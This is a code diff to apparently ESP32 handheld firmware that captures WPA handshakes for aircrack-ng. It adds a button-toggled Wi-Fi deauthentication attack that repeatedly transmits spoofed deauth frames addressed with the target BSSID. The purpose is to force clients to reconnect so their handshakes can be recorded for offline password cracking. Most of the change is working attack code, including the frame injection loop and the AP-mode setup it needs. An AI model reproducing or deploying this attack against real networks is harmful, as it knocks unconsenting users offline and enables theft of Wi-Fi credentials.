@@ -5,6 +5,8 @@
 // BSSID, saves them to a PCAP file on SD card, and shows a live
 // packet counter. Also captures beacon frames so aircrack-ng can
 // match ESSID -> BSSID.
+// Press Enter (or BtnA) to toggle deauth — forces clients to
+// re-authenticate, generating handshake frames.
 
 #include "esp_wifi.h"
 
@@ -33,6 +35,11 @@ static String hsTargetSsid;
 
 // Beacon counter — reset each session, cap at 3 to save PCAP space
 static int beaconCount = 0;
+
+// Deauth toggle state — press Enter/BtnA to toggle
+static bool deauthEnabled = false;
+static uint32_t lastDeauthTime = 0;
+#define DEAUTH_INTERVAL_MS 200
 
 // Promiscuous callback
 // Runs in WiFi task context — no file I/O, no display calls, no long delays.
@@ -198,6 +205,8 @@ void wifiHandshakeLoop() {
 		handshakeTotalPackets = 0;
 		beaconCount = 0;
 		fileOpen = false;
+		deauthEnabled = false;
+		lastDeauthTime = 0;
 
 		// Snapshot target params (BSSID pointer from scan may become stale)
 		memcpy(hsTargetBssid, bssid, 6);
@@ -216,8 +225,15 @@ void wifiHandshakeLoop() {
 			}
 		}
 
-		// Set WiFi and enable promiscuous sniffing
-		WiFi.mode(WIFI_STA);
+		// Set WiFi mode to APSTA: STA for promiscuous sniffing,
+		// AP for sending deauth frames via esp_wifi_80211_tx
+		WiFi.mode(WIFI_AP_STA);
+		WiFi.softAP("x", "", hsTargetChannel, 1, 1, true);
+
+		// Copy deauth frame template for targeted deauth
+		memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+		// Enable promiscuous sniffing
 		esp_wifi_set_promiscuous(true);
 		esp_wifi_set_promiscuous_rx_cb(&wifiHandshakeSniffCb);
 
@@ -231,11 +247,12 @@ void wifiHandshakeLoop() {
 		esp_wifi_set_channel(hsTargetChannel, WIFI_SECOND_CHAN_NONE);
 
 		String lines[] = {
-			L->TXT_WIFI_HANDSHAKE_CAPTURING,
 			hsTargetSsid,
 			"Ch: " + String(hsTargetChannel)
 		};
-		centeredPrintRows(lines, 3, SMALL_TEXT);
+		centeredPrintRows(lines, 2, SMALL_TEXT, true);
+		drawSpinner();
+		canvas.pushSprite(0, getStatusBarHeight());
 
 		Serial.println("Handshake capture: ch=" + String(hsTargetChannel) +
 			" bssid=" + mac + " ssid=" + hsTargetSsid);
@@ -258,26 +275,48 @@ void wifiHandshakeLoop() {
 		lastFlushedCount = handshakeTotalPackets;
 	}
 
-	// Refresh display when new packets arrive
-	static int lastDisplayedCount = -1;
-	if (handshakeTotalPackets != lastDisplayedCount) {
-		lastDisplayedCount = handshakeTotalPackets;
+	// Toggle deauth
+	if (isKbEnterPressed() || isBtnAWasPressed()) {
+		deauthEnabled = !deauthEnabled;
+		soundBeep();
+	}
 
+	// Send deauth frames when enabled (throttled to DEAUTH_INTERVAL_MS)
+	if (deauthEnabled) {
+		uint32_t now = millis();
+		if (now - lastDeauthTime >= DEAUTH_INTERVAL_MS) {
+			lastDeauthTime = now;
+			memcpy(&deauth_frame[10], hsTargetBssid, 6);
+			memcpy(&deauth_frame[16], hsTargetBssid, 6);
+			esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
+		}
+	}
+
+	// Refresh display every frame for spinner animation
+	{
 		char buf[40];
 		snprintf(buf, sizeof(buf), L->TXT_WIFI_HANDSHAKE_PACKETS, handshakeTotalPackets);
 
+		const char* deauthLine = deauthEnabled
+			? L->TXT_WIFI_HANDSHAKE_DEAUTH_ON
+			: L->TXT_WIFI_HANDSHAKE_DEAUTH_OFF;
+
 		String lines[] = {
-			L->TXT_WIFI_HANDSHAKE_CAPTURING,
 			hsTargetSsid,
 			"Ch: " + String(hsTargetChannel),
-			String(buf)
+			String(buf),
+			String(deauthLine)
 		};
-		centeredPrintRows(lines, 4, SMALL_TEXT);
+		centeredPrintRows(lines, 4, SMALL_TEXT, true);
+		drawSpinner();
+		canvas.pushSprite(0, getStatusBarHeight());
 	}
 
 	if (checkExit()) {
+		deauthEnabled = false;
 		esp_wifi_set_promiscuous(false);
 		esp_wifi_set_promiscuous_rx_cb(nullptr);
+		WiFi.softAPdisconnect(false);
 
 		if (fileOpen && pcapFile) {
 			pcapFile.flush();
